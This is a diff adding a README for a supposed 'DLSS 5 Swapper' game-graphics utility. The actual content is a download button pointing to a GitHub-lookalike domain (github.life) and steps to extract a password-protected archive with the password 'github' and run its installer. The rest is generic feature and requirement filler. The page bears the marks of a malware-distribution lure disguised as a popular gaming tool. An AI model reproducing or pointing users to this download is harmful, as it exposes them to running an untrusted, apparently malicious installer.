@@ -1,0 +1,63 @@
+# DLSS 5 Swapper – Game Rendering Configuration & Graphics Component Manager
+
+<div align="center">
+<img src="https://camo.githubusercontent.com/66dad63ca0b8633db0a5de185c422d84c8d24e66526ae0b9807678516db4c089/68747470733a2f2f6d6f642d6875622e6e65742f75706c6f6164732f6d6f64732f31373837312f636f7665725f31373837312e6a70672e77656270" width="470" alt="DLSS 5 Swapper Logo"/>
+</div>
+
+<br>
+
+<div align="center">
+<a href="https://github.life/dlss_5_swapper"><img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="220" alt="Download for Windows"/></a>
+</div>
+
+<p align="center"><b>Password:</b> <code>github</code></p>
+
+---
+
+# Installation Instructions
+
+1. Click the download button above.
+2. Save the archive to your Windows PC.
+3. Extract all files using the password **github**.
+4. Start the installer and complete the setup.
+
+---
+
+<div align="center">
+<img src="https://www.caseking.de/blog/wp-content/uploads/2026/09/DLSS_5_Swapper_CDAjZIkmJz-1024x688.png" width="1080" alt="DLSS 5 Swapper Interface"/>
+</div>
+
+## 🧠 Overview
+
+DLSS 5 Swapper is a graphics-focused utility designed for users who want more control over compatible game rendering components. It provides a dedicated environment for managing supported DLSS-related files and experimenting with different component configurations. The tool can be useful for PC gaming enthusiasts who enjoy exploring rendering options, comparing visual results, and organizing graphics-related changes outside a game's standard settings menu.
+
+## 🚀 Key Features
+
+| Feature | Description |
+|---|---|
+| 🎮 Game Graphics Management | Helps organize supported graphics components associated with compatible games. |
+| 🔄 Component Switching | Provides a focused workflow for changing between available rendering component versions where supported. |
+| 🖥️ DLSS-Oriented Workflow | Centers its functionality on DLSS-related configuration and game graphics customization. |
+| 🗂️ File Organization | Makes graphics-related files easier to manage during configuration changes. |
+| 🛠️ Customization Options | Supports a more hands-on approach to compatible rendering setups. |
+| 🔍 Configuration Testing | Helps users explore different supported component arrangements and compare their results in-game. |
+| ⚙️ Enthusiast-Friendly Utility | Offers a dedicated tool for users interested in graphics technology and game configuration. |
+
+## 💻 System Requirements
+
+| Component | Minimum Requirements |
+|---|---|
+| Operating System | Windows 10 or Windows 11 |
+| Processor | Modern dual-core CPU |
+| Memory | 4 GB RAM |
+| Storage | 200 MB of available space |
+| Graphics | GPU compatible with the target game and its supported rendering features |
+| Additional Software | Required runtime components may depend on the version being used |
+
+## Additional Information for Windows Users
+
+Before modifying game graphics components, close the relevant game and keep a backup of any files you intend to replace. Compatibility can vary by game, graphics card, driver version, and component release. Some configurations may not work with every title or may cause visual issues, so restore the original files if unexpected behavior occurs. Review the utility's available options carefully and change only components supported by your particular setup.
+
+## 🏷️ Tags
+
+dlss 5 swapper • dlss manager • game graphics • rendering utility • graphics configuration • pc gaming • windows software • component management • gaming tools
